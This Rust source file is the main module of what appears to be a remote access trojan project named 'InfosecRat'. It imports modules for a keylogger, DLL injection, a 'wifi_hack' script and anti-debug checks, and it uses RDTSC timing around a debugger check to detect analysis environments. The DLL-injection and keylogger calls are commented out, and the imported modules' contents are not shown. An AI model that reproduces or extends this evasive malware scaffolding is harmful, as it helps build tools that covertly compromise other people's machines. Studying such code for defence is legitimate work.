// mod keylogger;
mod helper_fns;
mod dllinjection;
mod BasicCryptoAlgos;
mod maliciousScripts;
mod AntiDebugChecks;


// use keylogger::keylogger::keylog;
// use helper_fns::mem_alloc::mem_alloc;
use dllinjection::injector::inject_dll;
use std::env::args;
use std::process::exit;
// use BasicCryptoAlgos::aes_exec::aes_execute;
// use BasicCryptoAlgos::xor_cipher;
use maliciousScripts::wifi_hack::wifi_ext;
use AntiDebugChecks::peb_traversal::check_debug;
use std::time::{Instant,Duration};
use std::arch::asm;

#[derive(Debug,Default)]
struct ULARGE_INTEGER{
    LowPart: u32,
    HighPart: u32,
}

impl ULARGE_INTEGER{
    fn quad_part(&self) -> u64{
        ((self.HighPart as u64)<<32) | (self.LowPart as u64)
    }

    }


fn main(){
    let cmd_args: Vec<String> = args().collect();
    //The collect function or method gives us the collected set of any iterable struct converted to another type just like join in python
    // if cmd_args.len()<=2{
    //     eprintln!("Usage ./InfosecRat.exe <processWindowName> <dllPath>");
    //     exit(0);
    // }
    // inject_dll(&cmd_args[1],&cmd_args[2]);
    let mut start_time = ULARGE_INTEGER::default();
    let mut end_time = ULARGE_INTEGER::default();

    unsafe{
    //We have to calculate the time before hand and then store it inside a variable
    let start = Instant::now();
    asm!(
        "xor rcx,rcx",
        "rdtsc",
        out("rdx") start_time.HighPart,
        out("rax") start_time.LowPart,
    );
    unsafe{check_debug();}
    asm!(
        "xor rcx,rcx",
        "rdtsc",
        out("rdx") end_time.HighPart,
        out("rax") end_time.LowPart,
    );
    let duration = start.elapsed();
    let rdtsc_duratin = end_time.quad_part() - start_time.quad_part();
    //the quad part converts the time into a representable form

    }
}